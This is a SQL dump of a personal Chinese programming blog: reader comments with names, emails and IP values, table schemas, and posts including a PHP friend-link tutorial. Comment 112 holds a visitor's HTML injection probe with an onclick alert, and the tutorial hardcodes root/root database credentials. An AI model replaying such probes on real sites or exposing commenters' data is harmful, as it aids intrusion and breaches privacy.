(79, 48, 0, 'J.Y', '466599721@qq.com', '0', 1278210593, 1, 'ok', 0, 0, 1901942023),
(80, 50, 0, 'xin', 'jianxin11@126.com', '0', 1279881580, 1, '你是宿舍第一个走的呀，我却是全班倒数第三个走的，要送走每一个，伤感呀~~\n     咔咔，纸巾fighting呀，知道我是谁吧~~哈哈', 0, 0, 3550262564),
(81, 50, 2, '0', '0', '0', 1280122789, 1, '知道你是边个~~jianxin同学嘛。你呢朋友都系广东省的，没太多伤感啦以后还有大把机会见面~~我就唔同啦，以后都唔知有没有机会翻青岛一次', 80, 0, 0),
(82, 50, 0, '锦辉君', 'nichocjh@126.com', '0', 1280556610, 1, '准备上岗了，去DZ，有不小的鸭梨啊~~~', 0, 0, 2067870681),
(83, 50, 2, '0', '0', '0', 1280664384, 1, '得啦~~都唔系好辛苦的啦~~起码日日可以go home，我可能中秋先能回来', 82, 0, 0),
(84, 28, 0, 'photon', '381290779@qq.com', '0', 1281517156, 1, '你自己写的代码怎么运行不了，我调试时发现 dy by y那些局部变量都是0，请问怎么回事？能说下么，QQ381290779', 0, 0, 2102728082),
(85, 28, 2, '0', '0', '0', 1281527577, 1, '多得您的提醒，原来自己最后那个地方写错了，应该是调用goTop_beta才对，setTimeout(&quot;goTop_beta()&quot;,time);循环调用自身', 84, 0, 0),
(86, 52, 0, 'J.Y', '466599721@qq.com', '0', 1281676584, 1, '比无字天书好点，毕竟是有字的', 0, 0, 1901927440),
(87, 52, 2, '0', '0', '0', 1281678738, 1, '你条粉肠又浪费了我数据库一个ID号~~等我回来你请我去星空啦~~', 86, 0, 0),
(88, 49, 0, 'Mxrain92', 'mxrain92@live.cn', 'http://www.oraclever.com/', 1282119047, 1, '。。填那么多资料。。把想说的忘了', 0, 0, 992838415),
(89, 49, 2, '0', '0', '0', 1283242394, 1, '不都是一些很基本的信息么……不算多了', 88, 0, 0),
(90, 49, 0, 'Mxrain92', 'mxrain92@live.cn', 'http://www.oraclever.com/', 1282119077, 1, '很漂亮', 0, 0, 992838415),
(91, 36, 0, 'tffg', '35435@qq.com', '0', 1283846887, 1, 'htrhtrh', 0, 0, 3071354472),
(92, 53, 0, '锦辉君', 'nichocjh@126.com', '0', 1284041568, 1, '老细，你D文章好牛b，不过都是俺看不懂的~~', 0, 0, 1872002441),
(93, 53, 2, '0', '0', '0', 1284554309, 1, '额……过奖了，如果你也是做我呢行的话或者比我懂得更多……', 92, 0, 0),
(94, 50, 0, '路路', 'zlulu2006@163.com', '0', 1286178383, 1, '好久没有来看看了，越来越棒了，呵呵，加油啊！', 0, 0, 3395809540),
(95, 50, 2, '0', '0', '0', 1286416241, 1, '感谢路路来访~~', 94, 0, 0),
(96, 53, 0, '尔珂', '815770541@qq.com', '0', 1286860313, 1, '呵呵，终于有个地了，写下来', 0, 0, 3055607370),
(97, 53, 2, '0', '0', '0', 1287294674, 1, '这位儿科同学，评论不一直都有啊……', 96, 0, 0),
(98, 56, 0, '美文', 'touchjun@gmail.com', 'http://www.meiwenzhang.com', 1287544251, 1, '皮肤不错啊，真漂亮\n能否交换个链接，做个朋友\n墨客草屋：www.meiwenzhang.com/blog', 0, 0, 2061519706),
(99, 56, 2, '0', '0', '0', 1287548655, 1, '嗯，多谢赞赏，欢迎交流~~', 98, 0, 0),
(100, 43, 0, 'weekend', '415370743@qq.com', '0', 1288325177, 1, '纸巾，看了你两篇文章，感觉你真的越来越牛B了。对比于自己的生活、工作。。。真的很是一塌糊涂啊（自嘲ing）。。。anyway，希望你能在自己的职业道路上越走越远，远到我都不能望你项背就最好了（hehe~）  What？不知道我是谁？你不是要我留下邮箱地址吗，还有你提到的IP to location，估计你这么厉害应该会查出我是谁吧。好吧，我也要努力啊，为了N年以后的童鞋聚会不至于出丑而奋斗啊！祝：生活愉快，工作顺利，天天向上！\n', 0, 0, 3070557234),
(101, 43, 2, '0', '0', '0', 1288515966, 1, '哈哈，伟权同学，多谢你的留言，每个人都越来越牛b的，并不是只有我，你不也在你自己熟悉与感兴趣的领域越来越牛b了。\n\n话说也已经很久没聚过会了，我都很久没见大家了，不过还是很怀念高中的日子，希望日后聚会上有机会能见面啦，同时也祝你生活愉快，工作顺利，天天向上。', 100, 0, 0),
(102, 50, 0, '岚风', 'jiangshaofeng10@mails.gucas.ac', '0', 1289120873, 1, '飘过~~~比心机啦~~~', 0, 0, 3528245952),
(103, 50, 2, '0', '0', '0', 1289307645, 1, '哦~~得啦，腻今日冲左凉未啊~~', 102, 0, 0),
(104, 57, 0, 'Photon', '381290779@qq.com', '0', 1289397816, 1, '现在写这种文章，有意思么，你无非是要讲搜索自动补全功能，这玩意儿早出来了，现在才写，感觉你都有点落后。\n提个建议：自动匹配这功能确实很八错，用户一般打完字儿是按键盘上下键选择的，上面例子里貌似不行，有待改进，呵呵~~\n另外，google前不久出来个新玩意儿，用英语写文章都能给你自动匹配，http://scribe.googlelabs.com/，太有雄心壮志了。\nPS：俺就是那位搞Java，无所事事，浏览贵站拜访第四代博客...', 0, 0, 2102730526),
(105, 57, 2, '0', '0', '0', 1289792223, 1, '哈哈，你是相当滴串啊~~按上下键选择那个在做的时候还真没想到呢~日后完善完善，做个出来玩玩而已，请原谅，善哉善哉', 104, 0, 0),
(106, 57, 0, '锦辉君', 'nichocjh@126.com', '0', 1289741207, 1, '以后会成为马化腾第二，嗯嗯。。。\r\n还有，就是有人从你的博客来拜访我的blog，点解浏览量会大增？？？', 0, 0, 992280339),
(107, 57, 2, '0', '0', '0', 1289792355, 1, '马化腾并不是我偶像…我也觉得抄袭行为不可取，google才是值得我敬佩的，你blog浏览量大增这个……这个就不知道了，你新浪博客没有查看流量来源的插件或者功能么？没有的可以整个第三方的看看', 106, 0, 0),
(108, 57, 0, 'J.Y', '466599721@qq.com', 'kni.com', 1290521106, 1, '怎么还没表情选项啊？', 0, 0, 3072523312),
(109, 57, 2, '0', '0', '0', 1290643660, 1, '您再期待一下吧，很快就有了，:-)', 108, 0, 0),
(110, 50, 0, 'NOproblem', '515749816@qq.com', 'http://50an.com', 1290844760, 1, '生活.......这就是乏味的生活', 0, 0, 1944048847),
(111, 50, 2, '0', '0', '0', 1290942487, 1, '也不至于乏味，做IT的人生活应该要充满激情，有自己的目标就很好，而且周末最好不要老是呆在电脑前出去转转，也是不错滴', 110, 0, 0),
(112, 59, 0, 'photon', '123@qq.com', '0', 1292338723, 1, '&lt;inputtype=''button'' value=''你玩完了'' onclick=''alert(this.value);''&gt;[:weixiao]', 0, 0, 2102524538),
(113, 59, 2, '0', '0', '0', 1292587653, 1, 'photon怎老觉得您是怀着一种bs的心态来的，你提交的内容这样就算了，连你的邮箱也乱填，而且你这句inputtype没分开。因为paperen已经对提交的html标记进行过滤了，所以不好意思~让你失望了', 112, 0, 0),
(114, 59, 0, 'killerman', 'manht@126.com', '0', 1293024172, 1, '[:bx][:bx]怎么没有数学题了[:bj]，还想再来过把瘾呢~~~~', 0, 0, 3683634461),
(115, 59, 2, '0', '0', '0', 1293066675, 1, 'killerman，現在不需要你填寫驗證碼啦~~用程序判斷評論是不是人為發出的而不是由別的程序自動添加的[:cb]', 114, 0, 0),
(116, 50, 0, 'killerman', 'manht@126.com', '0', 1293024794, 1, '除了点击IE的后退，怎么回到我刚才进来前的日志列表啊？', 0, 0, 3683634461),
(117, 50, 2, '0', '0', '0', 1293066878, 1, '你點擊IE的後退就不關paperen網站的事情了……點擊後退回剛才進來前的日誌列表不是很正常的事情麼……[:han]', 116, 0, 0),
(118, 60, 0, '锦辉君', 'nichocjh@126.com', '0', 1294929063, 1, '个blog越来越出色了~~赞一个[:fk][:br][:br]', 0, 0, 2018696461),
(119, 19, 0, '董淑丽', '1558161227@qq.com', '0', 1297518374, 1, '[:weixiao]我在这真的好无聊啊', 0, 0, 2030755950),
(120, 19, 2, '0', '0', '0', 1297569378, 1, '[:han]抱歉了……我写的东西可能不太好或者不太适合你看吧', 119, 0, 0),
(121, 66, 0, 'ifsamn', '466599721@qq.com', '0', 1298463724, 1, '[:xiu]还RP 50...哥谁谁便便扶老奶奶过马路都 5000了', 0, 1, 3072521036),
(122, 66, 0, 'ifsamn', '466599721@qq.com', '0', 1298463571, 1, '好久无来，估唔到呢度连表情选择都猥琐左[:weixiao]', 0, 1, 3072521036),
(123, 66, 2, '0', '0', '0', 1298464117, 1, '甘米正好咯，适合你', 122, 0, 0),
(124, 50, 0, 'huazi', 'jiahua.2010@163.com', '0', 1298778069, 1, '哈哈……', 0, 1, 1020537460),
(125, 3, 0, '岚风', 'jiangshaofeng10@mails.gucas.ac', '0', 1299402590, 1, '我又飘过了~~~北风吹我过来的~~~比心机啦~~得闲过来探你~寒假见太少啦~~下次给力点[:br]', 0, 1, 3528246053),
(126, 3, 2, '0', '0', '0', 1299944129, 1, '是谁不给力呢……约了你多少次……', 125, 0, 0),
(127, 3, 0, '小琳', 'angela41133@163.com', '0', 1299939091, 1, 'Hi~~[:br]我是小琳，蒋少峰的邻居。[:br]这个网站不错哦~', 0, 1, 2030840579),
(128, 3, 2, '0', '0', '0', 1299944200, 1, '哈哈，nice to meet you~谢谢光临', 127, 0, 0),
(129, 51, 0, 'dorri', 'hudongliai@126.com', '0', 1300973819, 1, '不错、不错、、发表评论的表情类别太少了啊、', 0, 1, 2047102102),
(130, 51, 2, '0', '0', '0', 1301030460, 1, '这还不够你用的，每个表情都很适合你啦:-)', 129, 0, 0),
(131, 51, 0, 'codeeer', '70193805@qq.com', '0', 1300978382, 1, '东西还是不错的，可惜离断网还有7天了，就不弄了，等高考之后我来下载[:br]PS：我找了又找，没找到下载链接。你弄哪去啦啦啦啦，要明显点喔', 0, 1, 2075812450),
(132, 51, 2, '0', '0', '0', 1301030564, 1, '在后面倒数14行，下载，就两个字，好，我有空弄明显点，多谢支持:-)', 131, 0, 0),
(133, 66, 0, '岁月无痕', 'd-yaoy@qq.com', '0', 1301044514, 1, '一进来就喜欢上了这样的风格.[:cb][:se][:han]表情我也喜欢.哇咔咔', 0, 1, 3738702545),
(134, 66, 2, '0', '0', '0', 1301052145, 1, '哈哈，多谢 :-)', 133, 0, 0),
(135, 50, 0, 'anyonedy', 'dengyi.anyone@gmail.com', '0', 1302840008, 1, '深圳是个好地方啊。', 0, 1, 3689566600),
(136, 50, 2, '0', '0', '0', 1302866801, 1, '哈哈，深圳是个好地方，只是我觉得我不属于深圳', 135, 0, 0),
(137, 68, 0, '流风33', 'liustorm-3uu@yahoo.com.cn', '0', 1304756179, 1, '评论框一直盯着我，我好紧张', 0, 0, 993566074),
(138, 68, 2, '0', '0', '0', 1304842683, 1, '就是要给你鸭梨才会留言嘛，哈哈', 137, 0, 0),
(139, 68, 0, '尔珂', '815770541@qq.com', '0', 1307524333, 1, '呵呵，好长时间没看了，这也是新版了，呵呵，更新很快啊，很好！很好！[:br]不是，为啥非得填邮箱类，呵呵，就害怕一个框一个框的写字。[:fk]', 0, 1, 3055607373),
(140, 68, 2, '0', '0', '0', 1307874283, 1, '邮箱是必须的嘛~昵称，邮箱，内容已经是最小输入了，而且邮箱还关联头像的（如果你有gravatar 帐号的话）', 139, 0, 0),
(141, 30, 0, 'mr.von', 'mr_von_chn@sina.com', '0', 1310562162, 1, '这东西竟然慢的才一个星期，不是打击，是严重的打击吧...叫我一个没学过php，ps，css的人情何以堪...[:weixiao]', 0, 1, 3072109624),
(142, 30, 2, '0', '0', '0', 1310645311, 1, 'mr.von不太能了解你这里什么意思“竟然慢的才一个星期”？', 141, 0, 0),
(143, 30, 0, 'mr.von', 'mr_von_chn@sina.com', '0', 1310792115, 1, '快的可能一两天，慢的也得一个星期吧，paperen我自己就属于那种不快也不慢的。[:br]慢的才1个星期就够而不是1个月，说明慢的很有速度，我的话估计几个月才能搞出来---的意思', 0, 1, 3072091895),
(144, 30, 2, '0', '0', '0', 1310804057, 1, '哦~~如果你有点php基础真的4，5天就可以弄自己的博客主题了，我没有夸张，哈哈', 143, 0, 0),
(145, 73, 0, '杨凡', 'drvfan@qq.com', '0', 1311072693, 1, '这博客真好。', 0, 1, 2063998856),
(146, 74, 0, '辉辉君', 'nichocjh@126.com', '0', 1315059310, 1, '生活没有如果，就算面对再多的困难，我们可以倾诉，可以支持与鼓励，但是回到现实，我们总要面对，肩负责任，走好自己的路。其实我也是很害怕的，担心自己。但愿有人能够共同走过光辉岁月。', 0, 0, 2006056891),
(147, 74, 2, '0', '0', '0', 1316087078, 1, '我现在又充满动力了，有时候人总得会那么迷茫一会，但是当再坚持一下就好了，再坚持一下，我也不知道为什么还要坚持……但也没有借口不去坚持，而你会找到那个能够共同走过光辉岁月的人的，当然你不会希望那个人是个男的吧……', 146, 0, 0),
(148, 1, 0, '林海草原', 'ubuntutoday@gmail.com', '0', 1318637038, 1, '你真的好厉害呀，我不是专业研究这个的，看到你的研究成果很多都让我一头雾水，我要慢慢学习这些，学习过程中肯定会不少麻烦你呢。', 0, 1, 2026407572),
(149, 1, 2, '0', '0', '0', 1319114022, 1, '我相信有兴趣去学的话任何人都可以超越那些牛人，就更不要说超越我了，so你也一样', 148, 0, 0),
(150, 73, 0, '荒野无灯', 'admin@ihacklog.com', '0', 1322737783, 1, '博客皮肤非常的清爽~~', 0, 1, 3549372132),
(151, 56, 0, '天涯', 'mengfali@sohu.com', '0', 1322797292, 1, '请问一个问题：[:br]现在这个日历可选择的年份有很多，如何减少呢？比如限定在2010--2015等之类的年份段。[:br]谢谢。', 0, 1, 3662725356),
(152, 56, 0, '天涯', 'mengfali@sohu.com', '0', 1322797495, 1, '请问一个问题：[:br]现在这个日历可选择的年份有很多，如何减少呢？比如限定在2010--2015等之类的年份段。[:br]谢谢。', 0, 1, 3662725356),
(153, 56, 2, '0', '0', '0', 1322807563, 1, '修改calendar.js的87行，或者你可以在外面定义两个全局变量\nvar yearstart = 2002;\nvar yearend = 2011;\n然后将87行改为：for(var k = yearend; k &gt;= yearstart; k--) {', 152, 0, 0),
(154, 48, 0, 'pengguang', 'pengguang001@gmail.com', '0', 1323065673, 1, '兄弟，你这网站咋整得呢？需要申请域名、空间吧。望指点。', 0, 1, 3682955716),
(155, 48, 2, '0', '0', '0', 1324107897, 1, '对，自己申请域名、买空间', 154, 0, 0),
(156, 31, 0, '初雪', '1040614893@qq.com', '0', 1324470210, 1, '博客不错哦！简洁大方', 0, 1, 2067667258),
(157, 31, 2, '0', '0', '0', 1324480896, 1, '谢谢', 156, 0, 0),
(158, 80, 0, 'b灰', 'nichocjh@126.com', '0', 1325773980, 1, '靠，竟然在公车上问女生拿手机号，真是勇气可嘉啊~[:weixiao]', 0, 0, 989823457),
(159, 80, 2, '0', '0', '0', 1326037793, 1, '我的没结果…你也是时候出击了', 158, 0, 0),
(160, 80, 0, 'smilence', '381290779@qq.com', '0', 1325664277, 1, '[:bx]', 0, 0, 2102727678),
(161, 24, 0, 'next_step', 'enki.hyq@gmail.com', '0', 1325827008, 1, '[:xia]', 0, 0, 1903572647),
(162, 80, 0, 'jiajia_liang', '418649314@qq.com', '0', 1329755814, 1, '有没有看过“苏宁”那个广告？在微博上发张照片告诉全世界你想认识她~或许她会知道的~', 0, 0, 3074366970),
(163, 70, 0, 'italk', 'wazcwz@163.com', '0', 1326962200, 1, '你好，很喜欢逛你的博客，我很喜欢这个程序，我想要mysql的，但我不会改，你可以改过后发到我邮箱吗？谢谢。', 0, 0, 2073474935),
(164, 70, 2, '0', '0', '0', 1327221201, 1, '哈哈，这里吧 http://iamlze.cn/archive/paperenblog-source/ 有不少bug，正在设计新的博客', 163, 0, 0),
(165, 82, 0, 'young', 'hhxueyuan@gmail.com', '0', 1329897918, 1, '最近博客写的很少呀，希望多写点，介绍点新技术，持续关注你的博客.....', 0, 0, 989490260),
(166, 82, 0, 'smilence', 'smilence86@gmail.com', '0', 1329995828, 1, '我网站就做了类似的功能，Log4J记录日志，保存到txt实体文件，身份、IP、时间，重要事情都有记录，还做了个手动清空日志的功能，不然txt文件会很大。', 0, 0, 2102729146),
(167, 31, 0, 'hello', '616669319@qq.com', '0', 1332470483, 1, '娃', 0, 0, 989577552),
(168, 24, 0, 'nut', '859043961@qq.com', '0', 1332898736, 1, '请问，您写的一篇关于URL参数部份加密的文章这里怎么没有呢？', 0, 0, 3738484488);

-- --------------------------------------------------------

--
-- 表的结构 `config`
--

CREATE TABLE IF NOT EXISTS `config` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `key` varchar(20) NOT NULL COMMENT '配置项',
  `value` tinytext NOT NULL COMMENT '配置',
  PRIMARY KEY  (`id`),
  KEY `key` (`key`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='配置表' AUTO_INCREMENT=1 ;

--
-- 转存表中的数据 `config`
--


-- --------------------------------------------------------

--
-- 表的结构 `link`
--

CREATE TABLE IF NOT EXISTS `link` (
  `id` mediumint(8) unsigned NOT NULL auto_increment,
  `name` varchar(30) NOT NULL COMMENT '链接名',
  `url` varchar(50) NOT NULL COMMENT 'URL',
  `email` varchar(35) NOT NULL default '0' COMMENT '邮箱',
  `image` int(10) unsigned NOT NULL default '0' COMMENT '链接图片',
  `order` mediumint(8) unsigned NOT NULL default '0' COMMENT '排序',
  `meta` varchar(255) NOT NULL default '0' COMMENT '说明',
  PRIMARY KEY  (`id`),
  UNIQUE KEY `email` (`email`),
  KEY `image` (`image`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='链接表' AUTO_INCREMENT=3 ;

--
-- 转存表中的数据 `link`
--

INSERT INTO `link` (`id`, `name`, `url`, `email`, `image`, `order`, `meta`) VALUES
(1, 'catman的博客', 'catman.c.blog.163.com', 'catman@163.com', 0, 0, '有为的青年'),
(2, '流风大侠', 'www.stormcn.cn', 'stormcn@163.com', 0, 0, '电脑报的刘版主');

-- --------------------------------------------------------

--
-- 表的结构 `post`
--

CREATE TABLE IF NOT EXISTS `post` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `title` varchar(50) NOT NULL COMMENT '标题',
  `urltitle` varchar(50) NOT NULL COMMENT 'URL标题',
  `categoryid` mediumint(8) unsigned NOT NULL COMMENT '文章类别ID',
  `content` text NOT NULL COMMENT '文章内容',
  `authorid` mediumint(8) unsigned NOT NULL COMMENT '作者ID',
  `ispublic` tinyint(1) unsigned NOT NULL default '1' COMMENT '是否已经发布',
  `click` smallint(6) unsigned NOT NULL default '0' COMMENT '浏览数',
  `good` smallint(4) unsigned NOT NULL default '0' COMMENT '顶次数',
  `bad` smallint(4) unsigned NOT NULL default '0' COMMENT '踩次数',
  `savetime` int(10) unsigned NOT NULL COMMENT '保存时间戳',
  `posttime` int(10) unsigned NOT NULL COMMENT '发布时间戳',
  `isdraft` tinyint(1) unsigned NOT NULL default '0' COMMENT '是否是草稿',
  PRIMARY KEY  (`id`),
  KEY `categoryid` (`categoryid`),
  KEY `urltitle` (`urltitle`),
  KEY `ispublic` (`ispublic`),
  KEY `authorid` (`authorid`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='文章表' AUTO_INCREMENT=84 ;

--
-- 转存表中的数据 `post`
--

INSERT INTO `post` (`id`, `title`, `urltitle`, `categoryid`, `content`, `authorid`, `ispublic`, `click`, `good`, `bad`, `savetime`, `posttime`, `isdraft`) VALUES
(1, 'I am Paperen', 'i-am-paperen', 1, '<P>今天终于组建了paper的博客，因为目前整个博客的功能都是自己编的，所以安全性方面还是个未知数，如果某位仁兄发现了我这个博客哪处有BUG的话，麻烦给我发个邮件:)。 </p>\r\n<P>对于paper的博客，我是不会考虑能获得什么盈利的了，肯定不会插入那些广告什么的来打乱自己网页的美观，我觉得开源真的很好，而任何东西一有商业的介入，一谈到钱就没了味道，我就是想用这样一个空间来锻炼一下自己，而重要的是可以与大家进行分享，包括自己的经验，包括自己生活上的。</p><P>“保持网络上的自己与现实的我一致性”，这句话是我在某个个人网站看到的，也是我比较赞同的一句话。虽然生活中我不太喜欢跟陌生人交流，虽然我是个内向的人，但是在这里我更愿意跟大家交流。 </p><!--more-->\r\n<P>不过目前这个博客还是略显幼稚，功能很基本，代码很片面……当然一开始是想直接用WordPress算了，这个功能强大的php博客（当然也是开源的），但是既然自己都把博客的代码写好，就放出来呗，东西都是慢慢改善的啦，我相信WordPress一开始的时候也是像我现在这个博客这样，功能不会太强大的吧……（顺便自我安慰一下）在此再声明一下，此博客上除一些转载的文章外其他文章都是我paperen写的啦，希望如果有想转载的跟我说声就行，不说也勉强没所谓……哈哈，因为我觉得被大家认同就是很很很幸福的事情了。还有 不要乱发广告 啦，不要 乱留网址 ，如果想要友情链接的话，email我吧，我很欢迎。 </p>\r\n<P>慢慢完善，慢慢进步……正如我在today motto中写的那句：要学的东西还是很多很多，要走的路还是很长很长~~ </p>\r\n<P>最后：欢迎来到paper的博客！</p></p>', 2, 1, 1129, 1, 0, 0, 1256464078, 0),
(48, '新版博客的面世', 'newblog', 4, '<P>paperen终于在休闲中完成了新版博客，关于新版博客的皮肤趋向于简单型吧……paperen的美工功底也就那个水平~~~现在自己看了几眼怎又觉得以前那个皮肤貌似挺不错的~~~不过既然都做好新版的就先试用着吧，在这个版本的博客中paperen也重整了文件框架与程序的框架，应该为了以后的扩展性做了一些准备，包括皮肤的更换还有插件的引入。</p><P>对于日后可能会将旧皮肤做回来，因为paperen也为此想好了。一般来说还皮肤肯定需要更改视图文件，但是应该不会涉及到模型文件，目前使用的皮肤是blue，而当制作了新皮肤后在皮肤目录下建立一个新文件夹。</p><P>1.关于换肤功能，paperen在程序中对于视图的路径思路是这样的</p><!--more--><PRE>define(''TPL'', ROOT.''tpl/''.$_CONFIGS[''style''].''/'');<br /></PRE><P>ROOT站点根路径加上tpl，就是视图文件路径，然后再加上自己设置的皮肤文件夹，那么以后自己做好新皮肤后，在tpl文件夹中建立一个叫newskin文件夹，然后在后台更改一下配置就能调用到新皮肤了。这样就不会影响到模型文件了，你只要知道模型文件中处理出来的变量就能组织你自己的tpl文件了。</p><P>2.关于缓存的使用</p><P>在新博客中使用缓存主要是获取配置数据，你可以将一些网站基本的数据写到数据库中并生成一个缓存文件，然后在程序运行时引入该文件从而避免了访问数据库去获取配置数据。（例如：网站描述，关键词，皮肤，错误提示等等）</p><P>3.在前台放入了一个统计功能</p><P>对于这个功能paperen还是觉得挺有意义的，让大家能了解到paperen这个博客的具体情况。</p><P>4.还有个判断浏览器的功能</p><P>准确来说这个功能是用来推荐使用ie6的浏览者更新浏览器或者使用别的浏览器来访问的。</p><P>5.图标与背景图片都在一张图片中</p><P>减少服务器的请求数，不过也增加了html结构与css编写的难度。</p><P>总的来说，paperen对新博客的程序是感到满意的，但是对于皮肤上，paperen却开始动摇了……</p></p>', 2, 1, 1377, 4, 1, 0, 1276762610, 0),
(2, '11.2 天气 小雪，阴', '11.2-cold', 1, '<P>今年罕见的天气，早早就让我看到了雪，一早起来外面已经飘着小小的雪花，虽然没有北京那边那么大，但也算是下雪了。 </p>\r\n<P>大伙们都喊冷，一个个地添衣，自己昨晚还睡着凉席呢……大家都说我不是人了。 </p>\r\n<P>真没想到今年的天气冷得这么突然，前几天还十几度，今天就突然下雪了， 看着小雪花在外面随风打转，paperen我的心情也是有点奇怪的感觉，有点感触，也有点悲伤。或许是我又想多了，觉得雪并不是很美，美的只是我们面对下雪的时候的心情吧，会让大家不知不觉地就想到了某些事某些人。 </p><!--more-->\r\n<P>paperen我今早上也终于换掉了凉席，宿舍还没供应暖气，确实有点冷，又看了《Head.First.PHP》三十几页后就来写点东西，下午paperen我就要去面试了，一家网络公司，不知道能不能被录用，一会再整理一下自己的作品。 </p>\r\n<P> 小雪花又停了，外面真的很冷，不知道是不是最后一次在青岛渡过冬天了，心情一下子又沉重了起来，面对长远的未来，paperen我还是觉得有点沉重。</p></p>', 2, 1, 995, 0, 0, 0, 1257091200, 0),
(3, '第一次面试', 'first-interview', 1, '<P>第一次面试经历真的挺?的……打算三点过去的，但是谁知道在我睡午觉的时候，那个公司的经理打电话来了，我还傻傻的说我刚才在睡觉（那天真的冻傻了……），还没过去就给别人一个不好的印象……看来自己习惯没有约束太久了…… </p>\r\n<P>冲冲忙忙地赶过去，连电梯都玩我，15楼按不上，没法只能在14楼下……差不多3点终于到了，经理让我坐会，自己留意一下环境，他们的办公室是一个个房间形式的，有压迫感，不太宽敞，讲真不是很喜欢这种环境，但是没法，我是来面试的而已。 </p>\r\n<P>经理问了我些问题，关于自己的水平与优势，当然也苦笑一下刚才自己午觉的事情……之后就给我一个小任务，给他们网站后台添加上管理友情链接的功能，自我感觉不太难就直接上手了，不到五点就ok了，交作业后，经理就问了我学习上时间的事情，还有说了一下公司上下班的时间，明天就开始上班吧，自己不能以正常员工的身份，月薪最好只有9百多。之后我就走了，心情也不是特别的高兴，心里说：“哎！明天就不自由了……”，说实在还有些不习惯的。 </p><!--more-->\r\n<P>也想不到第一份工作就这样应聘上了，没太多的感觉，社会，工作，生活，人生……还是很漫长漫长的。 </p></p>', 2, 1, 1286, 0, 1, 0, 1257091256, 0),
(4, '面试那个小测试', 'test-of-interview', 2, '<P>第一天上班回来……累死了，头晕…… </p>\r\n<P>不说苦了，越说越累……直接入正题，话说昨天的面试那个作业，后台添加上可以管理友情链接的功能，就是一个很基本而且很简单的功能，paperen我不知道若我昨天没做出来会不会应聘成功。下面说说这个功能是如何实现吧。 </p>\r\n<P>要添加并管理友情链接，当然需要数据库的支持啦，不是说每添加一个友情链接就要去改页面的代码，这样维护性太差了而且也不合理。（这里的代码是自己回来后写的，当然某些部分与我在面试时写的不一样，特别是css那块）</p><!--more-->\r\n<P>一个超链接的格式不就是这样嘛：</p>\r\n<P>我的博客</p>\r\n<P>首先得要把html的结构弄好， 一个良好的html结构才能使得页面看起来舒服而且有利于后面代码的编写。 </p>\r\n<P>HTML code：</p><PRE>&lt;div id="friendlink"&gt;<br />&lt;h5&gt;友情链接&lt;/h5&gt;<br />&lt;ul&gt;<br />&lt;li&gt;&lt;a href="#"&gt;example&lt;/a&gt;&lt;/li&gt;<br />&lt;li&gt;&lt;a href="#"&gt;example&lt;/a&gt;&lt;/li&gt;<br />&lt;/ul&gt;<br />&lt;/div&gt;<br />&lt;div class="c"&gt;&lt;/div&gt;<br /></PRE><P>是不是很简单而且很清晰的一个结构，之后来写写css，来美化一下这个结构，使它更符合我们的视觉要求与人性化要求。 </p>\r\n<P>Css code：</p>\r\n<PRE>*{margin:0px;padding:0px;}\r\n/* 将所有元素的padding与margin至零是个好习惯啊，不然后期页面的设计可能会遇到不少麻烦 */<br />body{font-size:14px;}\r\n/* 定义整个页面的字体大小 */<br />a{color:#666600;text-decoration:none;}\r\n/* 定义超链接的颜色，使它不再是默认的蓝色（不太看） */<br />a:hover{color:#669900;text-decoration:underline;}\r\n/* a:hover定义当鼠标移到链接上面时的链接样式，使它与没移到上面时的样式有所不同，从而产生交换的效果 */<br />h5{color:#333333;background:#E8F4CE;height:30px;line-height:30px;font-size:14px;padding-left:10px;}\r\n/* 修饰一下H5 */<br />#friendlink {border:1px #CCCCCC solid;width:450px;margin:20px auto;}\r\n/* 给ID为friendlink的那个div加个边框并设置一下宽度与外边距*/<br />#friendlink li{display:block;float:left;width:80px;text-align:center;height:30px;line-height:30px;}\r\n/* 定义friendlink中li的样式，显示为块并左浮动，li的高与字高，line-height一般用于使容器中的字体垂直居中，十分好用，屡试不爽 */<br />.c{clear:both;} \r\n/* 或许有些人不明白这里为什么要加这样一个多余的div，确实这个是多余的html结构，但是并不是没有用，我们用来清除上面的li产生的浮动，避免影响到后面的html布局 */</PRE><P>这里给大家看看如果没有清楚浮动会导致的结果吧，一般在火狐中会出现这种情况，所以大家使用完浮动后记得要clear一下。 </p>\r\n<P>ie中（正常）：</p>\r\n<P><a href="http://localhost/paperenblog/file/1" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/1" alt="200912141260796533" title="上传于2009-12-14"></a></p>\r\n<P>火狐（简称FF）与Opera中：</p>\r\n<P><a href="http://localhost/paperenblog/file/2" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/2" alt="200912141260796600" title="上传于2009-12-14"></a></p>\r\n<P>完成了页面的排版与美化后就可以想想php怎样实现这个功能了， 我需要扩展一下mysql数据库的才能支持这个功能，我需要添加一个表friend_link,里面要添加三个字段：</p>\r\n<P>ID(int (5) ) ,NAME(varchar (50) ),URL( varchar (50) ),用myphpadmin弄还是很easy的。 </p>\r\n<P>那么数据库结构ok了之后就直接上代码啦，记住前面那个li的结构了吧？&lt;li&gt;example&lt;/li&gt;，我们要做的就是把数据库的URL字段数据放在href="#"中，将NAME字段的数据放到里面就是了。\r\n <P><PRE>PHP code：<br />&lt;?php <br />   $db=new sql();<br />   $sql="select * from link";<br />   $result=$db-&gt;query($sql);<br />?&gt;<br />&lt;div id="friendlink"&gt;<br />   &lt;h5&gt;友情链接&lt;/h5&gt;<br />   &lt;ul&gt;<br />&lt;?php <br />   while($tmp=mysql_fetch_array($result))<br />   {<br />?&gt;<br />   &lt;li&gt;&lt;a href="http://&lt;?=$tmp[′url′]?&gt;"&gt;&lt;?=$tmp[′name′]?&gt;&lt;/a&gt;&lt;/li&gt;<br />&lt;?php <br />   }<br />?&gt;<br /><P></p>\r\nclass sql<br />{<br />   private $conn;<br />   public function __construct()//构造函数<br />   {<br />      $where="localhost";<br />      $db="test";<br />      $user="root";<br />      $pwd="root";<br />      $this-&gt;conn=mysql_connect($where,$user,$pwd);//连接数据库并获得相应的连接字符串<br />      mysql_select_db($db);//选择连接的是哪个数据库<br />      mysql_query("set names ′gb2312′");//定义送入数据库的编码，这点不较重要，不然可能会出现乱码，就看你数据中定义数据编码是什么了<br />   }\r\n<P>   public function query($sql)<br />   {<br />      $result=mysql_query($sql);<br />      return $result;<br />   }</p>\r\n<P>   public function __destruct()//析构函数<br />   {<br />      